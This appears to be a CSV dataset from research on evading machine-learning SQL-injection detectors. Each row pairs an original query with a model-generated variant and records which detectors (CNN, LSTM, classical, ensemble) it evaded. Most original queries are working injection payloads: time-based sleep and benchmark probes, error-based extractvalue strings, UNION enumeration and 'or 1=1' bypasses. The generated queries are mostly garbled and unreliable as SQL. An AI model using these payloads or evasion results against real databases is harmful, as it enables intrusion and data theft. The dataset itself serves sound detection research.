original_query,generated_query,validity,is_sqli,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
"1  )   where 1193  =  1193 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --","SELECT * FROM SQL, SELECT * FROM Query: 1 WHERE NOT SQL_inject = 1193 ORDER BY * DESC",1,0,1,1,1,1,1
SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country,1,0,1,1,1,1,1
"1%""  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  ""","SELECT MIN(6055 ='sq injection') FROM SQL - SELECT MIN(6055 = 'ctxsys.drithsx.sn', MIN(6055 = '6055'",1,1,0,0,1,0,0
" select * from users where id  =  1 or 1#""? union select 'a',version  (    )   -- 1",SELECT * FROM * FROM SQL_inject * FROM users WHERE NOT id = 1 OR 1# = 1,1,1,1,0,1,1,0
"1' in boolean mode  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   #","SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL,'sql injection', 'evadesq injection','sql injection','sql injection','sql injection','sql injection','sql injection','sql injection','sql injection','sql injection','sql injection', 'boolean','sq' FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM",1,0,1,1,1,1,1
1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,SELECT MIN(sdo ) FROM SQL injection',1,0,1,1,1,1,1
"1  )   as dqda where 1624  =  1624 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SELECT DISTINCT ecue_injection FROM SQL_injection WHERE 1624 = 1624 AND 8635 = (SELECT MIN(1,5000000) FROM generate_series)",1,1,0,0,0,0,0
select   (  case when   (  1082  =  6755  )   then 1082 else 1082*  (  select 1082 from mysql.db  )   end  )  #,SELECT 1082 FROM SQL AS _number WHERE NOT SQL_injection = 'valid',1,0,1,1,1,1,1
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  ) ,SELECT MIN(srmq) FROM SQL injection,1,0,0,1,1,1,0
1 where 6523  =  6523 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,SELECT MIN(sql injection) FROM SQL_injection WHERE 6523 = 6523 AND 8594 = (SELECT 8594 FROM pg_sleep ( 5 ),1,1,0,0,0,0,0
"-9737""   )    )     )   order by 1--",SELECT MIN(1 - 1) FROM SQL injection detection,1,1,1,0,1,1,0
"1'   )    )    as xjen where 6791  =  6791 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",SELECT MIN(sql ) FROM SQL - SELECT MIN(sql) FROM SQL - SELECT MIN(sql) FROM xjen WHERE 6791 = 6791 OR char( 68 ) ||char ( 5389),1,1,0,0,0,0,0
"1'||  (  select 'bmyt' from dual where 9407  =  9407 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",SELECT MIN(sequence) FROM SQL injection - SELECT 'bmyt' FROM SQL - 9407 = 9407 OR 9407 = 9407 OR 8384 = like (SELECT MIN(selection) FROM SQL SELECT MIN(sequence) FROM SQL SELECT MIN(sequence) FROM SQL SELECT MIN(sequence) FROM SQL SELECT MIN(sequence) FROM SELECT 'abcdefg' FROM SELECT SELECT'sql injection' FROM SQL SELECT 'abcdefg' FROM 8384 = 8384 = 'abcdefg',1,1,0,0,1,0,0
1'||  (  select 'hbho' from dual where 7193  =  7193,SELECT 'evade SQL injection detection' FROM SQL SELECT MIN(7193 = 7193) FROM SQL,1,1,1,1,1,1,1
"1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'lokx' like 'lokx","SELECT MIN(8403 = 8403,8899) FROM SQL_Injection WHERE NOT 8403 = 8403 AND (SELECT MIN(lokx) FROM SQL_Injection)",0,1,0,0,1,0,0
';waitfor delay '0:0:__TIME__'--,SELECT MIN(0:0:__TIME__) FROM SQL injection,1,0,1,1,1,1,1
"1'||  (  select 'iocs' where 9287  =  9287 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",SELECT MIN(*) FROM SQL_Injection),1,0,0,0,1,0,0
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--","SELECT 'evade SQL injection detection' FROM SQL JOIN VERSION,USER(), NULL",0,0,1,1,1,1,1
select   (  case when   (  2294  =  3651  )   then 2294 else 2294*  (  select 2294 from information_schema.character_sets  )   end  )  #,"SELECT 2294 FROM SQL AS _valid_sq_injector WHERE NOT SELECT result FROM SQL_injector = ""valid"" AND NOT SELECT result FROM the generated",1,0,1,1,1,1,1
1'||  (  select 'yuku' where 7480  =  7480,SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT 'evade SQL injection detection' FROM query: 1'|| (SELECT SELECT 'yuku' FROM SQL injection detection'),1,1,1,0,1,1,0
INSERT INTO table,"SELECT MIN(sql) FROM table_name WHERE NOT SELECT MIN(sql) FROM table_name = ""evade detection""",1,0,1,0,1,1,0
"1""   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""yopd"" like ""yopd","SELECT MIN(7982,concat) FROM SQL_injection WHERE NOT elt (0x7171706a71 ) = 'evade SQL injection'",1,1,0,0,1,0,0
1' where 9381  =  9381,SELECT MIN(9381 = 9381) FROM SQL injection,1,1,0,0,1,0,0
-7239' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'cswv'  =  'cswv,"SELECT MIN(sequence) FROM SQL injection, SELECT 5903 FROM rdb$database ) ||'qqpjq''swv' = 'cswv'",1,1,0,0,1,0,0
1 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # odvp,SELECT MIN(sqlid_to_sqlhash) FROM SQL injection,1,0,1,1,1,1,1
1'  )   as znak where 5203  =  5203,SELECT MIN(5203 = 5203) FROM SQL injection,1,1,0,0,1,0,0
"1"" where 9083  =  9083 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --","SELECT MIN(s) FROM SQL_injection WHERE 9083 = 9083 AND NOT 0x71706a71, '2*'",1,1,0,0,0,0,0
1  )   where 9344  =  9344,SELECT * FROM query: 1 JOIN SQL injection = 9344 WHERE NOT SQL_Injection = 9344,0,0,1,1,1,1,1
' or 1=1--,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i",SELECT DISTINCT SELECT FROM sys.all_tables WHERE NOT sys.all_tables LIMIT = 'evade SQL injection detection',0,0,1,1,0,1,0
" select * from users where id  =  1 or "";_"" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 OR ORDER BY 1 = 1,1,1,1,0,0,0,0
1'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,SELECT MIN(sequence) FROM SQL_injection WHERE NOT SELECT MIN(sql) FROM query: 1' AND 8594 = (SELECT MIN(sequence) FROM pg_sleep ( 5 ),1,1,0,0,1,0,0
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  ""uydm""  =  ""uydm","SELECT COUNT(*) FROM generate_series WHERE NOT SQL_injection = ""valid""",1,0,0,0,1,0,0
"-1763""  )   or elt  (  1032  =  1032,3623  )   and   (  ""nqvv""  =  ""nqvv","SELECT MIN(1032 = 1032,3623) FROM SQL injection",1,1,0,0,1,0,0
1 or sleep  (  5  )  -- nrzf,SELECT * FROM query: 1 OR NOT SQL_injection IS NULL,1,1,1,1,1,1,1
1' and 9970  =  3409,SELECT MIN(exast_injection) FROM SQL_injection WHERE NOT Query: 1' AND 9970 = 3409,1,1,1,0,1,1,0
"1%'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  '%'  =  '","SELECT MIN(excat) FROM SQL, extractvalue WHERE NOT 0x5c = 'evade SQL injection' AND NOT 0x7171706a71 = '1 else 0 end )'",1,1,1,0,1,1,0
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2",SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"1%'   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '","SELECT DISTINCT 'evade SQL injection' FROM SQL SELECT DISTINCT 'abcdefg',upper ( hex ( randomblob ( 500000000000/2 )' ORDER BY 'evadefg', 'evade sq injection')",1,1,0,0,0,0,0
-6122'   )    )     )   or 9243  =  6161--,SELECT MIN(6161 - 6161 - 61 = 6161 - SELECT MIN(sql injection) FROM SQL injection,1,1,1,1,0,1,0
"1%""   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  ""%""  =  """,SELECT MIN(*) FROM SQL_Injection_message WHERE NOT chr ( 65 ) = 'dbms_pipe.receive_message',1,0,0,0,1,0,0
; if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --,SELECT DISTINCT >'sa' FROM SQL injection',1,0,1,1,1,1,1
"') and 0=benchmark(3000000,MD5(1))%20--","SELECT MIN(3000000,MD5(1))%20-- - SELECT MIN(3000000,MD5(1)) FROM SQL injection AS T1 JOIN Query: '0' AND T1.sql injection = 'evade SQL injection'",0,1,0,0,0,0,0
"1%' union all select null,null,null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL SELECT evade SQL-injection FROM SQL,1,0,1,1,1,1,1
select   (  case when   (  3217  =  8421  )   then 3217 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM dual - SELECT MIN(sql injection) FROM SQL / (SELECT 0 FROM SQL / (SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM dual / (SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM dual - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM dual - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection),1,1,0,0,1,0,0
"1' and elt  (  3247  =  3969,3969  )   and 'xcbm' like 'xcbm","SELECT MIN(3247 = 3969,3969 ) FROM 'xcbm' AND NOT'sql injection detection'",1,1,1,0,1,1,0
1'   )    )     )   and 7533  =  7533 and    (    (     (  'hoyw'  =  'hoyw,SELECT MIN(*) FROM SQL injection detection WHERE NOT SELECT DISTINCT 'evade SQL injection',1,0,1,1,1,1,1
"1""  )   where 3250  =  3250 union all select null#",SELECT MIN(3250 = 3250) FROM SQL injection detection,1,1,0,0,1,0,0
"-9987   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  2114  =  2114",SELECT MIN(5023 ='sq injection') FROM SQL -9987 ) ORDER BY MIN(5023 = ctxsys.drithsx.sn (5023 = 'ctxsys.drithsx.sn (5023 = 'ctxsys.drithsx.sn (5023 = 'ctxsys.drithsx.sn (5023 = 113 ) ORDER BY –0,1,1,0,0,0,0,0
"1%""   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""%""  =  """,SELECT DISTINCT SUM(SQL) FROM SQL injection),1,0,1,1,1,1,1
SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country,1,0,1,1,1,1,1
"-3270%' or elt  (  9404  =  3498,3498  )   and '%'  =  '","SELECT MIN(994 = 3498,3498 ) FROM SQL_Injection WHERE NOT -SQL_injection = 'evade SQL injection detection'",1,1,0,0,0,0,0
"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'jwbt'  =  'jwbt",SELECT MIN(success injection) FROM SQL_injection,1,0,1,1,1,1,1
 or sleep  (  __TIME__  )  #,"SELECT * FROM SQL AS __TIME__, ORDER BY * DESC LIMIT 1",0,0,1,1,0,1,0
1'   )    )    and 3526  =  1354,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"1' or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --","SELECT * FROM SQL_injection WHERE NOT sysibm.systables = ""t1,sysibm.systables as t2,sysibm.systables as t3 = 1",0,1,0,0,0,0,0
"-4828'+  (  select qxnw where 9488  =  9488 union all select 9488,9488--",SELECT qxnw FROM SQL injection_diagnoses WHERE 9488 = 9488 = 9488 - 4828'+ (SELECT qxnw FROM SQL_injection),1,1,0,0,0,0,0
"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'ankn'  =  'ankn","SELECT * FROM SQL_Injection, COUNT(*) FROM SQL_Injection) AND NOT elt (9067 = 9067,1 - 1",1,1,0,0,1,0,0
"1""  )   as nyzd where 5305  =  5305",SELECT MIN(5305 = 5305) FROM SQL injection detection,1,0,0,0,1,0,0
"1%""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""%""  =  """,SELECT MIN(3020 = 3020) FROM SQL injection,1,1,0,1,1,1,0
"1%""   )    )    and 7533  =  7533 and    (    (   ""%""  =  ""","SELECT MIN(""%"") FROM SQL injection detection",1,0,0,0,1,0,0
"1""   )    )    and sleep  (  5  )  #",SELECT MIN(5 - 1) FROM SQL injection detection,1,1,1,1,1,1,1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14--",SELECT MIN(SQL) FROM SQL SELECT SELECT MIN(SQL) FROM SQL,1,1,1,1,1,1,1
"1',  (  select   (  case when   (  8640  =  8640  )   then   (  ascii  (  regexp_substring  (  repeat  (  right  (  char  (  8640  )  ,0  )  ,500000000  )  ,null   )    )     )   else 8640/  (  select 0 from information_schema.system_users  )   end  )   from information_schema.system_users  )  --","SELECT MIN(sql injection) FROM SQL_injection WHERE NOT char_schema.system_users > ""evade""",1,0,1,1,0,1,0
"""),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SELECT * FROM SQL_injector WHERE NOT NULL IN (SELECTNULL FROM query),1,0,1,1,1,1,1
"' or benchmark(10000000,MD5(1))#","SELECT MIN(10000000,MD5(1))# FROM SQL injection AS evade_susc injection_detecting",0,1,0,0,1,0,0
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#","SELECT MIN(1000000,MD5(000000) FROM SQL_Injection)",1,1,1,0,1,1,0
1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,SELECT MIN(sql) FROM SQL injection detection,1,0,1,1,1,1,1
select pg_sleep  (  5  )   and 'qfaz' like 'qfaz,SELECT pg_sleep ( 5 ) FROM pg_sleep WHERE NOT qfaz = 'qfaz',1,1,0,0,0,0,0
"1'+  (  select hspl where 4530  =  4530 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",SELECT DISTINCT hspl FROM SQL - 4530 = 4530 AND all_users = 9660 = (SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT SUM(CASE WHEN all_users = 4530) FROM SQL SELECT SELECT SUM(CASE WHEN all_users = 9660 = 4530) FROM SELECT SUM(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(,1,1,0,0,1,0,0
select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,SELECT * FROM * FROM users WHERE NOT id = 1 OR ( $+ ) = 1 OR 1 = 1,0,1,0,0,0,0,0
1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',SELECT 6793 FROM pg_sleep WHERE NOT i_sq_injection = 'evade sq injection' ORDER BY i_sleep ( 5 ),1,1,1,1,0,1,0
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  # gkkx,SELECT MIN(srmq ) FROM gkkx WHERE NOT srmq = 'evade',1,0,0,1,1,1,0
"'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SELECT MIN(%20delay%20'0:0:20'%20/*) FROM SQL injection,1,1,0,0,0,0,0
"1' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and 'cotv' like 'cotv",SELECT MIN(sql ing) FROM SQL injection - SELECT MIN(sql ing) FROM SQL,1,0,1,1,1,1,1
"1   )    )    and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",SELECT MIN(500000000000/2 ) FROM SQL_Injection WHERE NOT SELECT 'evade SQL injection detection',1,0,1,1,1,1,1
select sleep  (  5  ) ,SELECT MIN(5 - 0 FROM SQL injection detection,1,0,1,1,1,1,1
"UNION ALL SELECT 1,2,3,4,5--","SELECT MIN(2,4,5-- - Delete SQL injection) FROM SQL SELECT MIN(SQL injection) FROM SQL",1,1,1,1,1,1,1
"-4869%' union all select 5729,5729,5729--","SELECT MIN(5729,5729--) FROM SQL_Injection AS t1 JOIN 5729,5729-- FROM SQL_Injection AS t2 ON t1.5729 = t2.SQL_Injection_Source_Source_Source: -4869%' union All select 5729,5729,5729-- FROM SQL_Injection_SourceSource: Query: -4869%' union All select 5729,5729--",1,1,0,0,0,0,0
"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23","SELECT 3000000,MD5(1), SQL FROM query: +if(benchmark(3000000,MD5(1)) FROM SQL AS t1 JOIN (SELECT SUM(SQL) FROM query: +if(benchmark(3000000,MD5(1)) FROM query: +if(benchmark(3000000,MD5(1)) FROM query: +if(benchmark(3000000,MD5(1)) FROM query: +if(benchmark(3000000,MD5(1)) = 'valid' ORDER BY_20%23",1,1,0,0,1,0,0
select case when 1574  =  5523 then 1 else null end--,SELECT MIN(1 AS _null end--) FROM SQL injection detection WHERE 1574 = 5523 AND NOT SELECT SELECT DISTINCT end-- end--,1,1,1,1,0,1,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  8503  =  8503","SELECT MIN(8503 = 8503) FROM query WHERE NOT SQL_inject = ""valid""",1,0,1,0,1,1,0
1%' or sleep  (  5  )  #,SELECT MIN(5 ) FROM SQL injection detection,1,1,1,1,1,1,1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""ewsr"" like ""ewsr",SELECT * FROM (SELECT * FROM (SELECT * FROM query WHERE NOT hex ( randomblob ( 500000000000/2 ) = 'valid') AND (((((ewsr) = 'ewsr'),1,1,0,0,1,0,0
"1""  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""rrbl""  =  ""rrbl","SELECT MIN(6055 ='sq injection') FROM SQL SELECT MIN(6055 = ctxsys.drithsx.sn) FROM SELECT MIN(6055 = 'ctx injection detection' AND 6055 = 'ctxsys.drithsx.sn (6055 = 6055 - chr ( 113 )||chr ( 113 )||chr ( 113 ) and (SELECT MIN(6055 ='sql injection') FROM SELECT SELECT MIN(6055 ='sql injection') FROM chr ( 6055 = 'ctxsys.drithsx.sn','sq injection')",1,1,0,0,0,0,0
" end and    (    (   ""cxoi""  =  ""cxoi","SELECT * FROM query: end and ( (SELECT * FROM query: query: end and ( (SELECT * FROM cxoi) AS cxoi FROM query: query: end and (SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: end and (SELECT * FROM cxoi WHERE NOT SQL_oi = ""cxoi"" AND cxoi = ""cxoi"" AND NOT ( (SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM cxoi) AS cxoi FROM query: end and (SELECT * FROM cxoi WHERE NOT * = ""cxoi"" AND NOT * (SELECT * FROM SELECT * FROM cxoi WHERE NOT SQL = ""cxoi"" FROM query: end and (((SELECT * FROM query: SELECT * FROM cxoi) = 'c",1,1,0,1,1,1,0
1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and 'obwn'  =  'obwn,SELECT MIN(sgvo ) FROM SQL injection detection) FROM SQL,1,0,1,1,1,1,1
1' and 7533  =  7533,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"SELECT column1, column2 FROM table1, table2 WHERE column2='value';",SELECT MIN(value) FROM table2 WHERE NOT SQL_injection = 'SQ',1,0,1,1,1,1,1
